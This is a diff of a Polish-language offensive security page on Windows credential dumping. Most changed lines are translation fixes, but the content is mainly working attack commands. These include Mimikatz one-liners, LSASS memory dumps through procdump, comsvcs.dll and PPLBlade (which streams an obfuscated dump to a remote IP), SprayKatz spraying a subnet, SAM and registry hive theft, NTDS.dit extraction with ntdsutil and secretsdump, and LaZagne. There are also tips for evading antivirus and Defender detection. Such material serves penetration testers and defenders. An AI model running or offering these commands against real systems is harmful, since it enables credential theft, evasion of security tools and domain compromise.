@@ -16,7 +16,7 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-**Znajdź inne rzeczy, które Mimikatz może zrobić na** [**tej stronie**](credentials-mimikatz.md)**.**
+**Znajdź inne rzeczy, które Mimikatz potrafi zrobić na** [**tej stronie**](credentials-mimikatz.md)**.**
 
 ### Invoke-Mimikatz
 ```bash
@@ -49,14 +49,18 @@ mimikatz_command -f "lsadump::sam"
 
 ### Procdump + Mimikatz
 
-As **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**jest legalnym narzędziem Microsoftu**, nie jest wykrywany przez Defendera.\
+Ponieważ **Procdump z** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**to legalne narzędzie Microsoftu**, nie jest wykrywane przez Defendera.\
 Możesz użyć tego narzędzia do **zrzutu procesu lsass**, **pobrania zrzutu** i **wyodrębnienia** **poświadczeń lokalnie** z zrzutu.
+
+Możesz również użyć [SharpDump](https://github.com/GhostPack/SharpDump).
 ```bash:Dump lsass
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 #Remote, mount https://live.sysinternals.com which contains procdump.exe
 net use Z: https://live.sysinternals.com
 Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+# Get it from webdav
+\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
 ```c:Extract credentials from the dump
@@ -67,14 +71,14 @@ mimikatz # sekurlsa::logonPasswords
 ```
 Ten proces jest realizowany automatycznie za pomocą [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Uwaga**: Niektóre **AV** mogą **wykrywać** użycie **procdump.exe do zrzutu lsass.exe** jako **złośliwe**, ponieważ **wykrywają** ciąg **"procdump.exe" i "lsass.exe"**. Dlatego **cichsze** jest **przekazanie** jako **argumentu** **PID** lsass.exe do procdump **zamiast** nazwy lsass.exe.
+**Uwaga**: Niektóre **AV** mogą **wykrywać** jako **złośliwe** użycie **procdump.exe do zrzutu lsass.exe**, ponieważ **wykrywają** ciąg **"procdump.exe" i "lsass.exe"**. Dlatego **ukrycie** się jako **argument** **PID** lsass.exe do procdump jest **bardziej dyskretne** **niż** użycie **nazwa lsass.exe.**
 
-### Zrzut lsass za pomocą **comsvcs.dll**
+### Zrzut lsass z **comsvcs.dll**
 
 DLL o nazwie **comsvcs.dll** znajdujący się w `C:\Windows\System32` jest odpowiedzialny za **zrzut pamięci procesu** w przypadku awarii. Ten DLL zawiera **funkcję** o nazwie **`MiniDumpW`**, zaprojektowaną do wywoływania za pomocą `rundll32.exe`.\
 Nie ma znaczenia użycie pierwszych dwóch argumentów, ale trzeci jest podzielony na trzy komponenty. Identyfikator procesu do zrzutu stanowi pierwszy komponent, lokalizacja pliku zrzutu reprezentuje drugi, a trzeci komponent to ściśle słowo **full**. Nie ma alternatywnych opcji.\
-Po przetworzeniu tych trzech komponentów, DLL angażuje się w tworzenie pliku zrzutu i przenoszenie pamięci określonego procesu do tego pliku.\
-Wykorzystanie **comsvcs.dll** jest możliwe do zrzutu procesu lsass, eliminując potrzebę przesyłania i uruchamiania procdump. Ta metoda jest opisana szczegółowo na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
+Po przetworzeniu tych trzech komponentów, DLL jest zaangażowany w tworzenie pliku zrzutu i przenoszenie pamięci określonego procesu do tego pliku.\
+Wykorzystanie **comsvcs.dll** jest możliwe do zrzutu procesu lsass, eliminując potrzebę przesyłania i uruchamiania procdump. Ta metoda jest szczegółowo opisana na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
 Następujące polecenie jest używane do wykonania:
 ```bash
@@ -103,7 +107,7 @@ Get-Process -Name LSASS
 **Kluczowe funkcjonalności**:
 
 1. Obejście ochrony PPL
-2. Obfuscacja plików zrzutów pamięci w celu unikania mechanizmów wykrywania opartych na sygnaturach Defendera
+2. Obfuscacja plików zrzutów pamięci w celu uniknięcia mechanizmów wykrywania opartych na sygnaturach Defendera
 3. Przesyłanie zrzutu pamięci metodami RAW i SMB bez zapisywania go na dysku (zrzut bezplikowy)
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
@@ -143,7 +147,7 @@ reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-**Pobierz** te pliki na swoją maszynę Kali i **wyodrębnij hashe** za pomocą:
+**Pobierz** te pliki na swoją maszynę Kali i **wyodrębnij hashe** używając:
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
@@ -204,7 +208,7 @@ Hash jest szyfrowany 3 razy:
 2. Deszyfruj **hash** używając **PEK** i **RC4**.
 3. Deszyfruj **hash** używając **DES**.
 
-**PEK** ma **tę samą wartość** w **każdym kontrolerze domeny**, ale jest **szyfrowany** wewnątrz pliku **NTDS.dit** używając **BOOTKEY** pliku **SYSTEM kontrolera domeny (jest inny między kontrolerami domeny)**. Dlatego, aby uzyskać kredencje z pliku NTDS.dit, **potrzebujesz plików NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
+**PEK** ma **tę samą wartość** w **każdym kontrolerze domeny**, ale jest **szyfrowany** wewnątrz pliku **NTDS.dit** używając **BOOTKEY** pliku **SYSTEM kontrolera domeny (jest inny między kontrolerami domeny)**. Dlatego, aby uzyskać dane uwierzytelniające z pliku NTDS.dit, **potrzebujesz plików NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
 
 ### Kopiowanie NTDS.dit za pomocą Ntdsutil
 
@@ -212,7 +216,7 @@ Dostępne od Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Możesz również użyć triku z [**kopią cienia woluminu**](#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że będziesz również potrzebować kopii pliku **SYSTEM** (ponownie, [**zrzutuj go z rejestru lub użyj triku z kopią cienia woluminu**](#stealing-sam-and-system)).
+Możesz również użyć triku z [**kopią zapasową woluminu**](#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że będziesz również potrzebować kopii pliku **SYSTEM** (ponownie, [**zrzutuj go z rejestru lub użyj triku z kopią zapasową woluminu**](#stealing-sam-and-system)).
 
 ### **Ekstrakcja hashy z NTDS.dit**
 
@@ -230,15 +234,15 @@ Na koniec można również użyć **modułu metasploit**: _post/windows/gather/c
 
 ### **Ekstrakcja obiektów domeny z NTDS.dit do bazy danych SQLite**
 
-Obiekty NTDS można wyodrębnić do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Wyodrębniane są nie tylko sekrety, ale także całe obiekty i ich atrybuty w celu dalszej ekstrakcji informacji, gdy surowy plik NTDS.dit został już pobrany.
+Obiekty NTDS można wyodrębnić do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ekstrahowane są nie tylko sekrety, ale także całe obiekty i ich atrybuty w celu dalszej ekstrakcji informacji, gdy surowy plik NTDS.dit został już pobrany.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-`SYSTEM` hive jest opcjonalny, ale pozwala na deszyfrowanie sekretów (hasła NT i LM, dodatkowe poświadczenia, takie jak hasła w postaci czystego tekstu, klucze kerberos lub zaufania, historie haseł NT i LM). Wraz z innymi informacjami, wyodrębniane są następujące dane: konta użytkowników i maszyn z ich hashami, flagi UAC, znacznik czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i członkostwa rekurencyjne, drzewo jednostek organizacyjnych i członkostwo, zaufane domeny z typem zaufania, kierunkiem i atrybutami...
+`SYSTEM` hive jest opcjonalny, ale umożliwia odszyfrowanie sekretów (hasła NT i LM, dodatkowe poświadczenia, takie jak hasła w postaci tekstu jawnego, klucze kerberos lub zaufania, historie haseł NT i LM). Wraz z innymi informacjami, wyodrębniane są następujące dane: konta użytkowników i maszyn z ich haszami, flagi UAC, znacznik czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i członkostwa rekurencyjne, drzewo jednostek organizacyjnych i członkostwo, zaufane domeny z typem zaufania, kierunkiem i atrybutami...
 
 ## Lazagne
 
-Pobierz binarkę z [tutaj](https://github.com/AlessandroZ/LaZagne/releases). Możesz użyć tej binarki do wyodrębnienia poświadczeń z kilku programów.
+Pobierz plik binarny z [tutaj](https://github.com/AlessandroZ/LaZagne/releases). Możesz użyć tego pliku binarnego do wyodrębnienia poświadczeń z kilku programów.
 ```
 lazagne.exe all
 ```
